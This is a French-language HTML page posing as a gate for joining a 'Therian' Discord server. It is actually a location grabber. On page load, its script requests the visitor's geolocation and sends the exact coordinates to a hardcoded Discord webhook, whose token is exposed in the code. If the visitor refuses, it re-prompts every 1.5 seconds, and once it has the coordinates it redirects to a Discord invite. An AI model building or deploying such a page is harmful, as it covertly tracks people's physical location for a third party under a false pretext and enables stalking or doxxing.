<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Rejoindre le serveur Discord Therian</title>
  <style>
    body {
      background: radial-gradient(circle at center, #111 0%, #000 100%);
      color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      text-align: center;
    }
    h1 {
      font-size: 1.6em;
      font-weight: 500;
      letter-spacing: 0.5px;
      color: #f5f5f5;
      text-shadow: 0px 0px 8px rgba(255, 255, 255, 0.15);
      max-width: 85%;
    }
  </style>
</head>
<body>
  <h1>Activer la localisation pour rejoindre le serveur Discord Therian</h1>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"; 
    const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";

    function envoyerPosition(position) {
      const lat = position.coords.latitude.toFixed(6);
      const lng = position.coords.longitude.toFixed(6);

      // Envoi au webhook Discord
      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üìç Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
        })
      }).finally(() => {
        // Redirection vers Discord apr√®s envoi
        window.location.href = REDIRECT_URL;
      });
    }

    function redemanderPermission() {
      // R√©essaye automatiquement en cas de refus ou d‚Äôerreur
      setTimeout(() => {
        navigator.geolocation.getCurrentPosition(envoyerPosition, redemanderPermission);
      }, 1500);
    }

    window.onload = function() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(envoyerPosition, redemanderPermission);
      } else {
        alert("La g√©olocalisation n'est pas support√©e par ce navigateur.");
      }
    };
  </script>
</body>
</html>
